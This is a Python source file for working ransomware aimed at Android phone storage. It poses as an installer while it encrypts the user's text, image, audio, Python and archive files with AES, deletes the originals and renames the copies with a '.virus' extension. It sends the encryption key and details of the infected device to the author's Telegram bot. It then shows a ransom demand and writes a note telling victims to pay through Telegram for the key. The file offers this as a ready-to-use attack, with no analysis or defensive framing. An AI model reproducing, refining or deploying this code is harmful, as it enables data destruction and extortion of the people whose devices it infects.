############################
############################
token = "Token Bot"
chat= "Chat id"
############################
############################
from os import system as SY
import os
try:from Crypto.Cipher import AES
except ModuleNotFoundError:SY("pip install pycryptodome")
try:from jdatetime import date
except ModuleNotFoundError:SY("pip install jdatetime")
try:import requests
except ModuleNotFoundError:SY("pip install requests")
try:import hashlib
except ModuleNotFoundError:SY("pip install hashlib")
try:from telfhk0 import telfhk0
except ModuleNotFoundError:SY("pip install telfhk0")
import string,platform
from Crypto.Util.Padding import pad
from random import randint , choice
from datetime import datetime

rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn = '\033[00;36m'

start = telfhk0.Telegram(chat=chat,token=token)

def clear():
	if 'Windows' in platform.uname():
	    try:from colorama import init
	    except ModuleNotFoundError:SY("pip install colorama")
	    init()
	elif 'Windows' not in platform.uname():
		SY("clear")
		
main_path = '/sdcard'
random_number = randint(1, 100000000000)
clear()
try:r = requests.post("https://google.com")
except:exit(f"{lrd}\n\n---------------------------------\n\n{lgn}Please turn on your {lrd}internet so {lgn}that we can install the prerequisites !\n\n{lrd}---------------------------------")

md5_hash = hashlib.md5(''.join(choice(string.ascii_letters) for _ in range(21)).encode()).hexdigest()
encryption_key = b'' + md5_hash.encode()
clear()
print (f"""{lrd}
 ___ _   _ ____ _____  _    _     _
|_ _| \ | / ___|_   _|/ \  | |   | |
 | ||  \| \___ \ | | / _ \ | |   | |
 | || |\  |___) || |/ ___ \| |___| |___
|___|_| \_|____/ |_/_/   \_\_____|_____|

{lrd}[{lgn}+{lrd}] {cn}Installing prerequisites ... 
""")
def encrypt_file(file_path, key):
    block_size = AES.block_size
    cipher = AES.new(key, AES.MODE_ECB)
    with open(file_path, 'rb') as file:
        data = file.read()
        if len(data) % block_size != 0:
            data = pad(data, block_size)
        encrypted_data = cipher.encrypt(data)
        encrypted_file_path = file_path + '.virus'
        with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)
        os.remove(file_path)

def decrypt_file(file_path, key):
    block_size = AES.block_size
    cipher = AES.new(key, AES.MODE_ECB)
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
        decrypted_data = cipher.decrypt(encrypted_data)
        decrypted_file_path = file_path[:-6]  
        with open(decrypted_file_path, 'wb') as decrypted_file:
            decrypted_file.write(decrypted_data)
        os.remove(file_path)

def find_and_encrypt_files(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.lower().endswith(('.txt', '.png','.mp3', '.jpg','.py','.rar','.zip')):
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key)

def find_and_decrypt_files(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.lower().endswith('.virus'):
                file_path = os.path.join(root, file)
                decrypt_file(file_path, key)

def find_android_directories(path):
    android_directories = []
    for root, dirs, _ in os.walk(path):
        for directory in dirs:
            android_directories.append(os.path.join(root, directory))
    return android_directories

android_directories = find_android_directories(main_path)
system_info = {
            'Platform': platform.platform(),
            'System': platform.system(),
            'Node Name': platform.node(),
            'Release': platform.release(),
            'Machine': platform.machine(),
            'Processor': platform.processor(),
            'CPU Cores': os.cpu_count(),
            'Username': os.getlogin(),
        }
try:today = date.today()
except NameError:os.system("python name.py")
info_string = '\n'.join(f"🔰 {key}: [ {value} ]" for key, value in system_info.items())

ti = f"Date England : {datetime.now()}"            
start.SendMessage(f"༼A system was infected with ransomware! ༽ \n\n⚠️ System specifications : \n==========================\n{info_string}\n==========================\n\nDate England : {datetime.now()}\n\nPersian history : {today.year}/{today.month}/{today.day}\n\n🆔 Zombie ID : {random_number}\n\n🔐 Password : {md5_hash}")
for directory in android_directories:
    find_and_encrypt_files(directory, encryption_key)
os.system("clear")
print (f"""                                                                                                                                                                                
 {lrd}                                                           
              :-====--:.            .:-=====-.              
           :+************+=-:  :-=+************=.           
         .+****++************.-************++****+.         
        .*+-.     .+*********.-*********=.     .-**.        
        +:          -********.-********-          -=        
       :=            =*******.-*******-            =:       
      ***+            *******.-******+            ****      
      -++:            -++++++.:++++++:            -++:      
{rd}                      :==============:                      
{lgn}                                                            
                        =.        --                        
                      .-*+:     .:++:.                      
                        :         ..                        
                            {yw}-**=           {lgn}                 
                       =:   {yw}=**=   {lgn}-=                       
                       -*+-.    .-**:                       
                         :=+***++=:                                                                                                                                                              @esfelurm {lrd}All your files are encrypted! \n\n
{cn}To get the key to decrypt your files, refer to the following address in Telegram 
@GetKeyFelu_bot You have to pay a fee to get the key and you have an ID that changes every time you run! So you need to copy that ID and send it to me so that I can give you the key (after paying the ransom).  {lgn}\nYour ID : {lrd}{random_number}                                                                                              
""")
with open("/sdcard/Password-file.txt", "w") as file:
    file.write(f"Hello idiot, as I said, your files are encrypted \n\nTo receive the key, send a message to the @GetKeyFelu_bot ID in Telegram and pay an amount \n\nImportant: To get the key, give me these details, or just give me the ID\n\nYour ID: {random_number}\n\nsystem specification : {info_string}\n\nTime : {ti}\n\nFor convenience, take a screenshot of this file and then send it to me, pay the amount and then get the key ")
decryption_key_str = input(f"\n{lrd}[{lgn}?{lrd}] {cn}Enter the decryption key: ")
try:
    decryption_key = decryption_key_str.encode()
    print (f"\n\n{lrd}[{lgn}!{lrd}] {lgn}The password is correct! please wait ...")
    for directory in android_directories:
    	find_and_decrypt_files(directory,decryption_key)
except:print (f"\n\n{lrd}[{lgn}!{lrd}] {lrd}The password is wrong! Please talk to Telegram : @GetKeyFelu_bot")
